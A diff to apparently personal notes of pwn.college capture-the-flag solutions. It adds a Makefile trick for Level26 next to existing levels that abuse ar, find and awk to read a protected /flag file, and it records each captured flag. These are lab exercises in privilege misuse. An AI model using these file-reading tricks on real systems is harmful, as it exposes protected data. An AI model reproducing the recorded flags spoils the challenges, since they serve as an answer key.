@@ -95,9 +95,23 @@ pwn.college{A7I5HGI7_suJAVVule_cvW-B_zN.0lM2EDLwIzW}
 /bin/ar p /flag.a
 pwn.college{0VOQzQpy9LX-ycBn2AI0mXrM7Wg.01M2EDLwIzW}
 
+## Level22
+
 ## Level25
 find /flag -exec cat \{\} \;
 pwn.college{0xstlY-Sr422_KC7Q9qEXBJCIuy.01N2EDLwIzW}
+
+## Level26
+Makefile
+```
+SHELL = /bin/sh
+x=cat
+
+all:
+	cat /flag
+```
+make
+pwn.college{gCE3UO5i2nNP-u0o2K6emjDklBS.0FO2EDLwIzW}
 
 ## Level34
 /bin/awk '{ print $1 }' /flag
